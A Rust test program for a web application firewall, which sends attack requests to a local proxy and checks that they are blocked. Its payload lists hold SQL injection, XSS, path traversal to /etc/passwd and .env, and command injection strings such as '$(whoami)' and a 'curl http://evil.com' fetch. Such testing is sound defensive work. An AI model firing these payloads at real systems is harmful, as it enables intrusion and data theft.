//! Comprehensive Security Test Suite
//!
//! Run with: cargo run --example comprehensive_security_test
//!
//! This tests ALL security features including the new path traversal
//! and command injection detection.
//!
//! Prerequisites:
//! 1. Start backend: cargo run --example mock_backend_tokio
//! 2. Start WAF: cargo run

use reqwest::blocking::Client;
use std::time::Duration;

struct TestResult {
    name: String,
    passed: u32,
    failed: u32,
}

fn main() {
    let client = Client::builder()
        .timeout(Duration::from_secs(10))
        .user_agent("PINGORA_WAF_TEST_SUITE")
        .build()
        .unwrap();

    println!("╔═══════════════════════════════════════════════════════════╗");
    println!("║   Comprehensive WAF Security Test Suite                   ║");
    println!("║   Testing: SQLi, XSS, Path Traversal, Command Injection   ║");
    println!("╚═══════════════════════════════════════════════════════════╝\n");

    let mut results: Vec<TestResult> = Vec::new();

    // =====================================================
    // Test Suite 1: SQL Injection
    // =====================================================
    let mut sqli_passed = 0;
    let mut sqli_failed = 0;

    println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    println!("🔒 TEST SUITE 1: SQL Injection Detection");
    println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");

    let sqli_tests = vec![
        ("/api/users?id=1%20OR%201=1", "Boolean-based SQLi"),
        (
            "/api/users?id=1'%20UNION%20SELECT%20*%20FROM%20passwords--",
            "UNION-based SQLi",
        ),
        ("/api/users?id=1;%20DROP%20TABLE%20users", "Stacked queries"),
        ("/api/login?user=admin'--", "Comment-based bypass"),
        ("/api/search?q=SLEEP(5)", "Time-based blind"),
    ];

    for (path, desc) in &sqli_tests {
        match client.get(&format!("http://localhost:6188{}", path)).send() {
            Ok(resp) if resp.status().as_u16() == 403 => {
                println!("   ✓ [BLOCKED] {}", desc);
                sqli_passed += 1;
            }
            Ok(resp) => {
                println!("   ✗ [FAILED] {} - Got {}", desc, resp.status());
                sqli_failed += 1;
            }
            Err(e) => {
                println!("   ✗ [ERROR] {} - {}", desc, e);
                sqli_failed += 1;
            }
        }
    }

    results.push(TestResult {
        name: "SQL Injection".to_string(),
        passed: sqli_passed,
        failed: sqli_failed,
    });

    // =====================================================
    // Test Suite 2: XSS Prevention
    // =====================================================
    let mut xss_passed = 0;
    let mut xss_failed = 0;

    println!("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    println!("🔒 TEST SUITE 2: XSS Prevention");
    println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");

    let xss_payloads = vec![
        ("<script>alert('XSS')</script>", "Script tag"),
        ("<img src=x onerror=alert('XSS')>", "Event handler"),
        ("<iframe src=javascript:alert(1)>", "JavaScript protocol"),
        ("<body onload=alert(1)>", "Body onload"),
        ("<svg onload=alert('XSS')>", "SVG onload"),
    ];

    for (payload, desc) in &xss_payloads {
        match client
            .post("http://localhost:6188/api/comment")
            .body(*payload)
            .send()
        {
            Ok(resp) if resp.status().as_u16() == 403 => {
                println!("   ✓ [BLOCKED] {}", desc);
                xss_passed += 1;
            }
            Ok(resp) => {
                println!("   ✗ [FAILED] {} - Got {}", desc, resp.status());
                xss_failed += 1;
            }
            Err(e) => {
                println!("   ✗ [ERROR] {} - {}", desc, e);
                xss_failed += 1;
            }
        }
    }

    results.push(TestResult {
        name: "XSS Prevention".to_string(),
        passed: xss_passed,
        failed: xss_failed,
    });

    // =====================================================
    // Test Suite 3: Path Traversal Detection
    // =====================================================
    let mut pt_passed = 0;
    let mut pt_failed = 0;

    println!("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    println!("🔒 TEST SUITE 3: Path Traversal Detection");
    println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");

    let path_traversal_tests = vec![
        ("/api/file?path=../../../etc/passwd", "Basic ../"),
        (
            "/api/file?path=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "URL encoded",
        ),
        ("/api/.htaccess", "Sensitive file"),
        ("/api/config/.env", "Env file"),
        ("/api/file?path=%252e%252e%252f", "Double encoded"),
        ("/etc/passwd", "Direct /etc/passwd"),
    ];

    for (path, desc) in &path_traversal_tests {
        match client.get(&format!("http://localhost:6188{}", path)).send() {
            Ok(resp) if resp.status().as_u16() == 403 => {
                println!("   ✓ [BLOCKED] {}", desc);
                pt_passed += 1;
            }
            Ok(resp) => {
                println!("   ✗ [FAILED] {} - Got {}", desc, resp.status());
                pt_failed += 1;
            }
            Err(e) => {
                println!("   ✗ [ERROR] {} - {}", desc, e);
                pt_failed += 1;
            }
        }
    }

    results.push(TestResult {
        name: "Path Traversal".to_string(),
        passed: pt_passed,
        failed: pt_failed,
    });

    // =====================================================
    // Test Suite 4: Command Injection Detection
    // =====================================================
    let mut ci_passed = 0;
    let mut ci_failed = 0;

    println!("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    println!("🔒 TEST SUITE 4: Command Injection Detection");
    println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");

    let cmd_injection_tests = vec![
        ("/api/exec?cmd=test;ls", "Semicolon chain"),
        ("/api/exec?cmd=test%7ccat", "Pipe operator"),
        ("/api/search?q=%24%28whoami%29", "$(command)"),
        ("/api/exec?shell=/bin/bash", "Shell path"),
        ("/api/fetch?cmd=curl%20http://evil.com", "Dangerous command"),
        ("/api/exec?path=%24PATH", "Environment variable"),
    ];

    for (path, desc) in &cmd_injection_tests {
        match client.get(&format!("http://localhost:6188{}", path)).send() {
            Ok(resp) if resp.status().as_u16() == 403 => {
                println!("   ✓ [BLOCKED] {}", desc);
                ci_passed += 1;
            }
            Ok(resp) => {
                println!("   ✗ [FAILED] {} - Got {}", desc, resp.status());
                ci_failed += 1;
            }
            Err(e) => {
                println!("   ✗ [ERROR] {} - {}", desc, e);
                ci_failed += 1;
            }
        }
    }

    results.push(TestResult {
        name: "Command Injection".to_string(),
        passed: ci_passed,
        failed: ci_failed,
    });

    // =====================================================
    // Test Suite 5: Legitimate Traffic (Should Pass)
    // =====================================================
    let mut legit_passed = 0;
    let mut legit_failed = 0;

    println!("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    println!("✅ TEST SUITE 5: Legitimate Traffic (Should Pass)");
    println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");

    let legitimate_tests = vec![
        ("/api/users/123", "User profile"),
        ("/api/search?q=hello+world", "Normal search"),
        ("/api/products?category=electronics", "Product query"),
        ("/api/files/documents/report.pdf", "Normal file path"),
    ];

    for (path, desc) in &legitimate_tests {
        match client.get(&format!("http://localhost:6188{}", path)).send() {
            Ok(resp) if resp.status().as_u16() == 200 => {
                println!("   ✓ [ALLOWED] {}", desc);
                legit_passed += 1;
            }
            Ok(resp) => {
                println!(
                    "   ✗ [BLOCKED] {} - Got {} (Should be 200)",
                    desc,
                    resp.status()
                );
                legit_failed += 1;
            }
            Err(e) => {
                println!("   ✗ [ERROR] {} - {}", desc, e);
                legit_failed += 1;
            }
        }
    }

    results.push(TestResult {
        name: "Legitimate Traffic".to_string(),
        passed: legit_passed,
        failed: legit_failed,
    });

    // =====================================================
    // Summary
    // =====================================================
    println!("\n╔═══════════════════════════════════════════════════════════╗");
    println!("║   TEST RESULTS SUMMARY                                    ║");
    println!("╠═══════════════════════════════════════════════════════════╣");

    let mut total_passed = 0;
    let mut total_failed = 0;

    for result in &results {
        let total = result.passed + result.failed;
        let pct = if total > 0 {
            (result.passed as f64 / total as f64) * 100.0
        } else {
            0.0
        };
        let status = if result.failed == 0 { "✅" } else { "⚠️" };
        println!(
            "║   {} {:20} {:2}/{:2} ({:5.1}%)                 ║",
            status, result.name, result.passed, total, pct
        );
        total_passed += result.passed;
        total_failed += result.failed;
    }

    println!("╠═══════════════════════════════════════════════════════════╣");

    let total_tests = total_passed + total_failed;
    let success_rate = if total_tests > 0 {
        (total_passed as f64 / total_tests as f64) * 100.0
    } else {
        0.0
    };

    println!(
        "║   TOTAL: {}/{} tests passed ({:.1}%)                       ║",
        total_passed, total_tests, success_rate
    );
    println!("╚═══════════════════════════════════════════════════════════╝\n");

    if total_failed == 0 {
        println!("🎉 ALL TESTS PASSED! WAF is fully operational.");
    } else {
        println!(
            "⚠️  {} tests failed. Review WAF configuration.",
            total_failed
        );
    }

    println!("\n📊 Metrics: http://localhost:6190/metrics");
}
